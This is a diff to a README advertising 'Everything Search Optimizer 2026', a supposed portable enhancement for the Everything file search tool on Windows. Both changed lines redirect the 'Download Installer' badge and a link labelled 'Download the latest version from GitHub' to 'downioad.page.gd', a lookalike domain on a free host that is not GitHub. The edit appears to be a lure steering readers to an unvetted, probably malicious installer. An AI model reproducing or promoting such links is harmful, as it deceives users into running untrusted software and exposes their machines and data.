@@ -2,7 +2,7 @@
 
 Welcome to the Everything Search Optimizer 2026, a comprehensive portable tool that enhances the file searching capabilities of the popular Everything search engine. Designed for Windows 10 and 11, this optimized version offers faster indexing, improved search algorithms, and additional features to boost your productivity. Whether you're a power user or a casual searcher, this tool provides a seamless and efficient way to manage your files.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -64,6 +64,6 @@ The 2026 update brings several improvements:
 
 For the latest version and updates, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Thank you for choosing the Everything Search Optimizer 2026. We hope it enhances your productivity and file management experience!
